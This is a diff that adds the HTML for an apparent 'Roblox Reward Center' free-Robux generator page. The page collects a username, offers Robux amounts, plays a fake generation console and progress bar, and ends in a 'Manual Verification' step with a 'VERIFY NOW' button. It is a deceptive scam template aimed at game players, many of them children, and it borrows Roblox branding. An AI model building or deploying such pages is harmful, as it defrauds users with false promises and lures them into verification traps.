@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Reward Center - Get Robux</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💎</text></svg>">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <header>
+        <div class="container header-flex">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox Logo" class="logo-img">
+                <span>REWARD HUB</span>
+            </div>
+            <div class="status-bar">
+                <span class="status-dot"></span> Server Status: <span class="status-text">Online</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <section id="step-1" class="card active">
+            <h2><i class="fas fa-user"></i> Find Your Account</h2>
+            <p>Enter your Roblox username to begin the process.</p>
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Username..." autocomplete="off">
+            </div>
+            <div class="platform-selector">
+                <div class="platform active" data-platform="pc"><i class="fas fa-desktop"></i></div>
+                <div class="platform" data-platform="mobile"><i class="fas fa-mobile-alt"></i></div>
+                <div class="platform" data-platform="console"><i class="fas fa-gamepad"></i></div>
+            </div>
+            <button id="connect-btn" class="btn-primary">Continue</button>
+        </section>
+
+        <section id="step-2" class="card">
+            <h2><i class="fas fa-gem"></i> Select Rewards</h2>
+            <p>Choose the amount of Robux you want to add to your account.</p>
+            <div class="reward-grid">
+                <div class="reward-item" data-amount="400">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">400</span>
+                    <span class="label">Robux</span>
+                </div>
+                <div class="reward-item" data-amount="800">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">800</span>
+                    <span class="label">Robux</span>
+                </div>
+                <div class="reward-item active" data-amount="1,700">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">1,700</span>
+                    <span class="label">Robux</span>
+                </div>
+                <div class="reward-item" data-amount="4,500">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">4,500</span>
+                    <span class="label">Robux</span>
+                </div>
+                <div class="reward-item" data-amount="10,000">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">10,000</span>
+                    <span class="label">Robux</span>
+                </div>
+                <div class="reward-item" data-amount="22,500">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" alt="Robux">
+                    <span class="amount">22,500</span>
+                    <span class="label">Robux</span>
+                </div>
+            </div>
+            <button id="generate-btn" class="btn-primary">Generate Now</button>
+        </section>
+
+        <section id="step-3" class="card">
+            <h2><i class="fas fa-sync fa-spin"></i> Generating...</h2>
+            <div class="console" id="console-log">
+                <p>Starting connection...</p>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+        </section>
+
+        <section id="step-4" class="card">
+            <h2 class="success-title"><i class="fas fa-check-circle"></i> Almost Done!</h2>
+            <p>Manual Verification is required to prevent bot abuse and ensure the Robux reaches the correct account: <strong id="display-username"></strong></p>
+            
+            <div class="verification-box">
+                <p>Click the button below to complete the final step.</p>
+                <button id="verify-btn" class="btn-verify pulse">VERIFY NOW</button>
+            </div>
+            <p class="small-text">Verification usually takes less than 2 minutes.</p>
+        </section>
+
+        <div class="recent-activity">
+            <h3>Recent Activity</h3>
+            <div id="activity-list">
+                <!-- Dynamically populated -->
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Roblox Reward Hub. This is a promotional landing page. Not affiliated with Roblox Corporation.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
